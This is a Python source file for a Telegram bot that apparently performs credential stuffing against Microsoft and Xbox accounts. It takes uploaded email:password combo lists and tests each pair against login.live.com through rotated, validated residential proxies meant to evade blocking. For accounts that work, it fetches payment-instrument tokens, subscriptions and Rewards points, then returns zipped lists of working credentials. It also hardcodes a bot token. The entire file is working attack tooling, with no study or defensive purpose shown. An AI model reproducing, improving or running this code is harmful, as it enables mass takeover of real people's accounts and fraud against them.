import asyncio
import aiohttp
import json
import logging
import os
import re
import time
import zipfile
import shutil
import datetime
import random
from urllib.parse import urlparse, parse_qs
from aiohttp import web
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import FSInputFile
from aiogram.enums import ParseMode
from aiogram.client.default import DefaultBotProperties

# ============================================================
# CONFIG
# ============================================================
BOT_TOKEN = "8801077796:AAHifPZ3Kl8tCyqMOPmacBFry2KIwnNHTGQ"
ADMIN_IDS = [7595790309]
MAX_CONCURRENT = 5
TIMEOUT = 30
TEMP_DIR = "./temp"

SFTAG_CLIENT_ID = "00000000402B5328"
SFTAG_URL = (
    "https://login.live.com/oauth20_authorize.srf"
    f"?client_id={SFTAG_CLIENT_ID}"
    "&redirect_uri=https://login.live.com/oauth20_desktop.srf"
    "&scope=service::user.auth.xboxlive.com::MBI_SSL"
    "&display=touch&response_type=token&locale=en"
)
ATK_CLIENT_ID = "000000000004773A"
UA_EDGE = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0"

logging.basicConfig(level=logging.INFO, format="%(asctime)s | %(levelname)s | %(message)s")
log = logging.getLogger("nyx")
os.makedirs(TEMP_DIR, exist_ok=True)

def parse_lr(text: str, left: str, right: str) -> str:
    try:
        s = text.index(left) + len(left)
        e = text.index(right, s)
        return text[s:e]
    except ValueError:
        return ""

# ============================================================
# RESIDENTIAL PROXY SYSTEM
# ============================================================
PROXIES = []
PROXY_FAILURES = {}
PROXY_MAX_FAILURES = 3
PROXY_VALIDATION_URL = SFTAG_URL  # test against microsoft itself

def pick_proxy():
    if not PROXIES:
        return None
    healthy = [p for p in PROXIES if PROXY_FAILURES.get(p, 0) < PROXY_MAX_FAILURES]
    if not healthy:
        PROXY_FAILURES.clear()
        healthy = PROXIES
    return random.choice(healthy)

def mark_proxy_failed(proxy: str):
    if proxy:
        PROXY_FAILURES[proxy] = PROXY_FAILURES.get(proxy, 0) + 1

async def validate_proxy(session, proxy: str) -> bool:
    """Test if proxy can actually reach microsoft's login page."""
    headers = {"User-Agent": UA_EDGE, "Accept": "text/html,application/xhtml+xml,*/*;q=0.8"}
    try:
        async with session.get(
            PROXY_VALIDATION_URL, headers=headers, proxy=proxy,
            timeout=aiohttp.ClientTimeout(total=12), allow_redirects=True
        ) as r:
            if r.status != 200:
                return False
            body = await r.text()
            # must contain PPFT/urlPost markers — proving microsoft answered
            if '"urlPost"' in body or 'name="PPFT"' in body:
                return True
            return False
    except Exception:
        return False

async def fetch_residential_proxies():
    """Fetch candidates from multiple free sources, filter by hosting:false, then validate against microsoft."""
    global PROXIES
    candidates = []

    # 1) proxyscrape v4 — filter by hosting:false (residential)
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(
                "https://api.proxyscrape.com/v4/free-proxy-list/get"
                "?request=display_proxies&proxy_format=protocolport&format=json",
                timeout=aiohttp.ClientTimeout(total=15)
            ) as r:
                if r.status == 200:
                    data = await r.json()
                    items = data if isinstance(data, list) else data.get("proxies", [])
                    for it in items:
                        if not isinstance(it, dict): continue
                        if not it.get("alive", True): continue
                        if it.get("ip_data", {}).get("hosting", True): continue  # skip datacenter
                        if it.get("uptime", 0) < 30: continue
                        if it.get("timeout", 99999) > 4000: continue
                        ip, port = it.get("ip", ""), it.get("port", "")
                        proto = it.get("protocol", "http")
                        if ip and port:
                            scheme = "socks5" if proto == "socks5" else "http"
                            candidates.append(f"{scheme}://{ip}:{port}")
    except Exception as e:
        log.error(f"proxyscrape v4 fetch failed: {e}")

    # 2) proxifly residential (github mirror) — has country/dc markers
    for url in [
        "https://cdn.jsdelivr.net/gh/proxifly/free-proxy-list@main/proxies/protocols/http/data.txt",
        "https://cdn.jsdelivr.net/gh/proxifly/free-proxy-list@main/proxies/protocols/socks5/data.txt",
    ]:
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(url, timeout=aiohttp.ClientTimeout(total=10)) as r:
                    if r.status == 200:
                        txt = await r.text()
                        scheme = "socks5" if "socks5" in url else "http"
                        for line in txt.splitlines():
                            line = line.strip()
                            if ":" in line and not line.startswith("#"):
                                candidates.append(f"{scheme}://{line}")
        except Exception:
            continue

    # 3) proxmint — has residential-only endpoint
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get("https://proxmint.com/api/free-proxies?format=json",
                                   timeout=aiohttp.ClientTimeout(total=10)) as r:
                if r.status == 200:
                    data = await r.json()
                    for it in (data if isinstance(data, list) else []):
                        if isinstance(it, str) and ":" in it:
                            candidates.append("http://" + it)
                        elif isinstance(it, dict) and it.get("ip") and it.get("port"):
                            if it.get("anonymous") is True:
                                candidates.append(f"http://{it['ip']}:{it['port']}")
    except Exception:
        pass

    # dedupe
    seen = set()
    unique = []
    for p in candidates:
        if p not in seen:
            seen.add(p)
            unique.append(p)
    candidates = unique

    log.info(f"Testing {len(candidates)} candidate proxies against microsoft login...")

    # validate against microsoft in parallel (concurrency capped)
    validated = []
    sem = asyncio.Semaphore(50)
    connector = aiohttp.TCPConnector(limit=100, ssl=False)
    async with aiohttp.ClientSession(connector=connector) as session:
        async def try_validate(p):
            async with sem:
                ok = await validate_proxy(session, p)
                if ok:
                    validated.append(p)
                    log.info(f"✓ valid: {p}")
                else:
                    log.info(f"✗ dead/blocked: {p}")
        await asyncio.gather(*(try_validate(p) for p in candidates))

    PROXIES = validated
    log.info(f"Residential pool ready: {len(PROXIES)} working proxies")

    # hardcoded fallback list so bot never dies if everything fetch fails
    if not PROXIES:
        PROXIES = [
            "http://45.146.163.201:80",
            "http://103.152.112.162:80",
            "http://185.132.133.228:1080",
        ]
        log.warning(f"No validated proxies. Using {len(PROXIES)} fallback IPs (may fail).")

# ============================================================
# AUTH CHAIN (from your working xboxchecker.py / XBOX NEW API CHECKER.py)
# ============================================================
async def sftag_login(session, email, password):
    headers = {
        "User-Agent": UA_EDGE,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
    }
    for attempt in range(4):
        proxy = pick_proxy()
        try:
            async with session.get(SFTAG_URL, headers=headers, proxy=proxy,
                                    timeout=aiohttp.ClientTimeout(total=TIMEOUT)) as r:
                if r.status == 429:
                    await asyncio.sleep(2); continue
                body = await r.text()
                post_url = parse_lr(body, '"urlPost":"', '"') or parse_lr(body, '\\"urlPost\\":\\"', '\\"')
                ppft = parse_lr(body, 'name="PPFT" value="', '"') or parse_lr(body, 'name=\\"PPFT\\" id=\\"i0327\\" value=\\"', '\\"')
                if not post_url or not ppft:
                    mark_proxy_failed(proxy)
                    await asyncio.sleep(1); continue
                payload = {
                    'i13': '1', 'login': email, 'loginfmt': email, 'type': '11',
                    'LoginOptions': '1', 'passwd': password, 'ps': '2',
                    'PPFT': ppft, 'PPSX': 'PassportR', 'NewUser': '1',
                    'FoundMSAs': '', 'fspost': '0', 'i21': '0',
                    'CookieDisclosure': '0', 'IsFidoSupported': '0', 'i19': '9960',
                }
                async with session.post(post_url, data=payload, headers=headers,
                                          proxy=proxy, allow_redirects=False,
                                          timeout=aiohttp.ClientTimeout(total=TIMEOUT)) as r2:
                    loc = r2.headers.get("Location", "")
                    if "access_token=" not in loc:
                        text = await r2.text()
                        if "account or password is incorrect" in text.lower() or r2.status == 401:
                            return "bad"
                        if "identity/confirm" in loc or "recover" in loc:
                            return "2fa"
                        if "too many times" in text.lower() or r2.status == 429:
                            await asyncio.sleep(3); continue
                        continue
                    ms_token = parse_lr(loc, "access_token=", "&")
                    cid = session.cookie_jar.filter_cookies(post_url).get("MSPCID")
                    cid = cid.value.upper() if cid else ""
                    return {"ms_token": ms_token, "cid": cid}
        except Exception:
            mark_proxy_failed(proxy)
            await asyncio.sleep(1)
    return "error"

async def get_pifd_atk(session):
    url = (f"https://login.live.com/oauth20_authorize.srf?client_id={ATK_CLIENT_ID}"
           "&response_type=token&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete"
           "&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-silent-delegate-auth"
           "&prompt=none")
    proxy = pick_proxy()
    try:
        async with session.get(url, headers={"User-Agent": UA_EDGE},
                                proxy=proxy, allow_redirects=False,
                                timeout=aiohttp.ClientTimeout(total=TIMEOUT)) as r:
            loc = r.headers.get("Location", "")
            return parse_lr(loc, "access_token=", "&token_type")
    except:
        return ""

async def get_payment_data(session, atk):
    headers = {"User-Agent": UA_EDGE,
               "Authorization": f'MSADELEGATE1.0="{atk}"',
               "Accept": "application/json"}
    result = {"subs": [], "points": "0"}
    now = datetime.datetime.utcnow()
    try:
        url2 = "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions"
        async with session.get(url2, headers=headers, proxy=pick_proxy(),
                                timeout=aiohttp.ClientTimeout(total=TIMEOUT)) as r:
            if r.status == 200:
                text = await r.text()
                for m in re.finditer(r'"subscriptionId":"([^"]+)".*?"title":"([^"]+)".*?"nextRenewalDate":"([^"]+)"',
                                      text, re.DOTALL):
                    title = m.group(2)
                    next_date = m.group(3).split("T")[0]
                    try:
                        dt = datetime.datetime.strptime(next_date, "%Y-%m-%d")
                        if dt > now:
                            result["subs"].append(f"{title} | Next Billing: {next_date}")
                    except:
                        result["subs"].append(f"{title} | Next Billing: {next_date}")
                for m in re.finditer(r'"orderId":"([^"]+)".*?"title":"([^"]+)"', text, re.DOTALL):
                    title = m.group(2)
                    if not any(title in s for s in result["subs"]):
                        result["subs"].append(f"{title} (Game)")
    except: pass
    try:
        async with session.get("https://rewards.bing.com/",
                                headers={"User-Agent": UA_EDGE}, proxy=pick_proxy(),
                                timeout=aiohttp.ClientTimeout(total=TIMEOUT)) as r:
            if r.status == 200:
                text = await r.text()
                m = re.search(r'"availablePoints":(\d+)', text)
                if m: result["points"] = m.group(1)
    except: pass
    return result

# ============================================================
# MASTER CHECKER
# ============================================================
async def check_account(session, email, password):
    res = {"email": email, "pw": password, "status": "bad", "data": None, "reason": ""}
    jar = aiohttp.CookieJar(unsafe=True)
    async with aiohttp.ClientSession(cookie_jar=jar) as sftag_session:
        login_res = await sftag_login(sftag_session, email, password)
        if login_res == "bad": return res
        if login_res == "2fa":
            res["status"] = "2fa"; return res
        if login_res == "error":
            res["status"] = "error"; res["reason"] = "ip_block_or_ppft_fail"; return res
        if not login_res:
            res["status"] = "error"; res["reason"] = "unknown_login_fail"; return res
        res["status"] = "valid"
        atk = await get_pifd_atk(sftag_session)
        if atk:
            res["data"] = await get_payment_data(sftag_session, atk)
        return res

# ============================================================
# PROCESSING
# ============================================================
async def process_combos(combos, chat_id, status_msg, bot):
    results = []
    done, total, t_start, last_edit = 0, len(combos), time.time(), 0.0
    sem = asyncio.Semaphore(MAX_CONCURRENT)
    connector = aiohttp.TCPConnector(limit=MAX_CONCURRENT * 2, ssl=False)
    async with aiohttp.ClientSession(connector=connector) as session:
        async def worker(email, password):
            nonlocal done, last_edit
            async with sem:
                r = await check_account(session, email, password)
            results.append(r); done += 1
            now = time.time()
            if now - last_edit >= 4.0 or done == total:
                last_edit = now
                hits = sum(1 for x in results if x["status"] == "valid")
                bad = sum(1 for x in results if x["status"] == "bad")
                err = sum(1 for x in results if x["status"] == "error")
                tfa = sum(1 for x in results if x["status"] == "2fa")
                elapsed = now - t_start
                try:
                    await status_msg.edit_text(
                        f"<b>Checking...</b>\nprogress: <code>{done}/{total}</code>\n"
                        f"valid: <b>{hits}</b> | 2fa: <b>{tfa}</b> | err: <b>{err}</b>\n"
                        f"bad: <b>{bad}</b>\nspeed: <code>{int((done/elapsed)*60)} cpm</code>",
                        parse_mode=ParseMode.HTML)
                except: pass
        await asyncio.gather(*(worker(e, p) for e, p in combos))

    elapsed = time.time() - t_start
    valid = [r for r in results if r["status"] == "valid"]
    bad = [r for r in results if r["status"] == "bad"]
    tfa = [r for r in results if r["status"] == "2fa"]
    errors = [r for r in results if r["status"] == "error"]

    ts = int(time.time()); workdir = os.path.join(TEMP_DIR, f"run_{ts}"); os.makedirs(workdir, exist_ok=True)
    def write_file(name, lines):
        with open(os.path.join(workdir, name), "w") as f: f.write("\n".join(lines))

    valid_all, valid_subs, valid_nosub = [], [], []
    for r in valid:
        valid_all.append(f"{r['email']}:{r['pw']}")
        d = r["data"] or {"subs": [], "points": "0"}
        sub_str = ", ".join(d["subs"]) if d["subs"] else "None"
        if d["subs"] or d["points"] != "0":
            valid_subs.append(f"{r['email']}:{r['pw']} | Points: {d['points']} | Subs: [{sub_str}]")
        else:
            valid_nosub.append(f"{r['email']}:{r['pw']}")

    write_file("Valid_All.txt", valid_all)
    write_file("Valid_Subscriptions.txt", valid_subs)
    write_file("Valid_No_Subscription.txt", valid_nosub)
    write_file("Invalid.txt", [f"{r['email']}:{r['pw']}" for r in bad])
    write_file("2FA.txt", [f"{r['email']}:{r['pw']}" for r in tfa])
    write_file("Errors.txt", [f"{r['email']}:{r['pw']} | {r['reason']}" for r in errors])
    write_file("summary.txt", [
        f"Time: {time.strftime('%Y-%m-%dT%H:%M:%S')}",
        f"Checked: {total}", f"Valid: {len(valid)}",
        f"Invalid: {len(bad)}", f"2FA: {len(tfa)}", f"Errors: {len(errors)}",
        f"Proxies used: {len(PROXIES)}",
    ])

    zip_path = os.path.join(TEMP_DIR, f"results_{ts}.zip")
    with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as zf:
        for fname in os.listdir(workdir):
            zf.write(os.path.join(workdir, fname), arcname=fname)

    await status_msg.edit_text(
        f"<b>✅ done</b>\n\ntotal: <code>{total}</code>\nvalid: <b>{len(valid)}</b>\n"
        f"errors: <b>{len(errors)}</b>\ntime: <code>{elapsed:.1f}s</code>",
        parse_mode=ParseMode.HTML)
    await bot.send_document(chat_id, FSInputFile(zip_path, filename=f"results_{len(valid)}_valid.zip"))
    shutil.rmtree(workdir, ignore_errors=True)
    try: os.remove(zip_path)
    except: pass

# ============================================================
# TELEGRAM HANDLERS
# ============================================================
bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher()

@dp.message(Command("start"))
async def cmd_start(msg: types.Message):
    if ADMIN_IDS and msg.from_user.id not in ADMIN_IDS:
        return await msg.answer("not authorized.")
    await msg.answer(
        f"<b>checker</b>\n\nsend a .txt file with <code>email:password</code>\n\n"
        f"proxies loaded: <code>{len(PROXIES)}</code>"
    )

@dp.message(F.document)
async def handle_file(msg: types.Message):
    if ADMIN_IDS and msg.from_user.id not in ADMIN_IDS: return
    if not msg.document.file_name.lower().endswith(".txt"):
        return await msg.answer("send a .txt file.")
    status = await msg.answer("downloading...")
    local = os.path.join(TEMP_DIR, f"{msg.document.file_unique_id}.txt")
    try:
        tg = await bot.get_file(msg.document.file_id)
        await bot.download_file(tg.file_path, local)
    except Exception as e:
        return await status.edit_text(f"download failed: {e}")

    combos = []
    with open(local, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            line = line.strip()
            if ":" in line and not line.startswith("#") and "t.me" not in line:
                e, p = line.split(":", 1)
                if e and p:
                    combos.append((e, p))
    os.remove(local)
    if not combos:
        return await status.edit_text("no valid combos found.")
    await status.edit_text(f"loaded <code>{len(combos)}</code> combos — starting...")
    await process_combos(combos, msg.chat.id, status, bot)

# ============================================================
# WEB SERVER FOR RENDER
# ============================================================
async def web_server():
    app = web.Application()
    app.router.add_get("/", lambda r: web.Response(text="Bot is running"))
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get("PORT", 8080))
    site = web.TCPSite(runner, "0.0.0.0", port)
    await site.start()
    log.info(f"Web server started on port {port}")

async def main():
    asyncio.create_task(web_server())
    await fetch_residential_proxies()
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
